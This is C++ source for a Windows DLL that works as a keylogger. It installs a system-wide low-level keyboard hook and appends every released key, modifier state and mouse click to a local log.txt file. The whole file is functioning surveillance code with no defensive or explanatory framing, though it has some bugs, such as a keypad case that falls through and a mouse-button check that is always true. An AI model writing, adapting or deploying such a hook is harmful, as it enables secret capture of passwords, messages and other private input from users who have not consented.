#include <windows.h>
#include <stdio.h>

HINSTANCE g_hInst = NULL;
HHOOK g_hHook = NULL;

void print(const char* format, ...)
{
	char* buffer = new char[2048];
	if (buffer == NULL)
		return;

	va_list vl;
	va_start(vl, format);
	vsprintf(buffer, format, vl);
	va_end(vl);

	HANDLE hFile = CreateFile("log.txt", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	DWORD dwWrite = lstrlen(buffer);
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, buffer, dwWrite, &dwWrite, NULL);
	CloseHandle(hFile);

	delete[]buffer;
}

void saveKeyToFile(int pressedKey)
{
	switch (pressedKey) {
	case 8:
		print("%s", "[R]");
		break;
	case 10: // 10 y 13 son para enter (?)
		print("%s", "\r\n");
		break;
	case 13:
		print("%s", "\r\n");
		break;
	case 32:
		print("%s", " ");
		break;
	case 42:
		print("%s", "*");
		break;
	case 43:
		print("%s", "+");
		break;
	case 45:
		print("%s", "-");
		break;
	case 46:
		print("%s", "[SUPR]");
		break;
	case 47:
		print("%s", "/");
		break;
	case 48:
		if (GetAsyncKeyState(VK_SHIFT))
			print("%s", ")");
		else
			print("%s", "0");
		break;
	case 49:
		if (GetAsyncKeyState(VK_SHIFT))
			print("%s", "!");
		else if (GetAsyncKeyState(VK_RMENU))
			print("%s", "|");
		else
			print("%s", "1");
		break;
	case 50:
		if (GetAsyncKeyState(VK_SHIFT))
			print("%s", "\"");
		else if (GetAsyncKeyState(VK_RMENU))
			print("%s", "@");
		else
			print("%s", "2");
		break;
	case 51:
		if (GetAsyncKeyState(VK_SHIFT))
			print("%s", " ");
		else if (GetAsyncKeyState(VK_RMENU))
			print("%s", "#");
		else
			print("%s", "3");
		break;
	case 52:
		if (GetAsyncKeyState(VK_SHIFT))
			print("%s", "$");
		else if (GetAsyncKeyState(VK_RMENU))
			print("%s", "~");
		else
			print("%s", "4");
		break;
	case 53:
		if (GetAsyncKeyState(VK_SHIFT))
			print("%s", "%");
		else if (GetAsyncKeyState(VK_RMENU))
			print("%s", "");
		else
			print("%s", "5");
		break;
	case 54:
		if (GetAsyncKeyState(VK_SHIFT))
			print("%s", "^");
		else if (GetAsyncKeyState(VK_RMENU))
			print("%s", " ");
		else
			print("%s", "6");
		break;
	case 55:
		if (GetAsyncKeyState(VK_SHIFT))
			print("%s", "&");
		else
			print("%s", "7");
		break;
	case 56:
		if (GetAsyncKeyState(VK_SHIFT))
			print("%s", "*");
		else
			print("%s", "8");
		break;
	case 57:
		if (GetAsyncKeyState(VK_SHIFT))
			print("%s", ")");
		else
			print("%s", "9");
		break;
	case 96: // Keypad
		print("%s", "0");
		break;
	case 97:
		print("%s", "1");
		break;
	case 98:
		print("%s", "2");
		break;
	case 99:
		print("%s", "3");
		break;
	case 100:
		print("%s", "4");
		break;
	case 101:
		print("%s", "5");
	case 102:
		print("%s", "6");
		break;
	case 103:
		print("%s", "7");
		break;
	case 104:
		print("%s", "8");
		break;
	case 105:
		print("%s", "9");
		break;
	case VK_MULTIPLY:
		print("%s", "*");
		break;
	case VK_ADD:
		print("%s", "+");
		break;
	case VK_SUBTRACT:
		print("%s", "-");
		break;
	case VK_DECIMAL:
		print("%s", ",");
		break;
	case VK_DIVIDE:
		print("%s", "/");
		break;
	case 188:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", "<");
		else
			print("%s", ",");
		break;
	case 192:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", "~~");
		else
			print("%s", "`");
		break;
	case 222:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", "\"");
		else
			print("%s", "'");
		break;
	case 220:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", "|");
		else
			print("%s", "\\");
		break;
	case 219:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", "{");
		else
			print("%s", "[");
		break;
	case 221:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", "}");
		else
			print("%s", "]");
		break;
	case 186:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", ":");
		else
			print("%s", ";");
		break;
	case 191:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", "?");
		else
			print("%s", "/");
		break;
	case 190:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", ">");
		else
			print("%s", ".");
		break;
	case 187:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", "+");
		else
			print("%s", "=");
		break;
	case 189:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			print("%s", "_");
		else
			print("%s", "-");
		break;
	case VK_CAPITAL:
		print("%s", "[CAPSLOCK]");
		break;
	case VK_TAB:
		print("%s", "[TAB]");
		if (GetAsyncKeyState(VK_RMENU))
			print("%s", "[ALTTAB]");
		break;
	case VK_LSHIFT:
		print("%s", "[LSHIFT]");
		break;
	case VK_RSHIFT:
		print("%s", "[RSHIFT]");
		break;
	default:
		print("%s", "");
		break;
	case VK_CONTROL:
		print("%s", "[CTRL]");
		break;
	case VK_ESCAPE:
		print("%s", "[ESC]");
		break;
	case VK_DOWN:
		print("%s", "[DOWN]");
		break;
	case VK_UP:
		print("%s", "[UP]");
		break;
	case VK_LEFT:
		print("%s", "[LEFT]");
		break;
	case VK_RIGHT:
		print("%s", "[RIGHT]");
		break; //da conflicto
	case VK_LBUTTON:
		print("%s", "[LCLICK]");
		break;
	case VK_RBUTTON:
		print("%s", "[RCLICK]");
		break;
	}
	if (pressedKey > 96 && pressedKey < 105) {
		print("%c", pressedKey - 48);
	}
	else if (pressedKey != VK_LBUTTON || pressedKey != VK_RBUTTON) {
		if (pressedKey > 64 && pressedKey < 91) {
			if (GetKeyState(VK_CAPITAL)){
				if (!GetAsyncKeyState(VK_SHIFT)) {
					print("%c", pressedKey);
				}
				else {
					print("%c", pressedKey + 32);
				}
			}
			else{
				if ( GetAsyncKeyState(VK_SHIFT)) {
					print("%c", pressedKey);
				}
				else {
					print("%c", pressedKey + 32);
				}

			}




		}
	}

}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && wParam == WM_KEYUP)
	{
		KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)lParam;
		saveKeyToFile(key->vkCode);
	}


	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

BOOL WINAPI InstallHook()
{
	g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
	return g_hHook == NULL;
}

BOOL WINAPI UnInstallHook()
{
	return UnhookWindowsHookEx(g_hHook);
}

BOOL WINAPI DllMain(IN HINSTANCE hDllHandle, IN DWORD nReason, IN LPVOID Reserved)
{
	switch (nReason)
	{
	case DLL_PROCESS_ATTACH:
		g_hInst = hDllHandle;
		break;
	}
	return TRUE;
}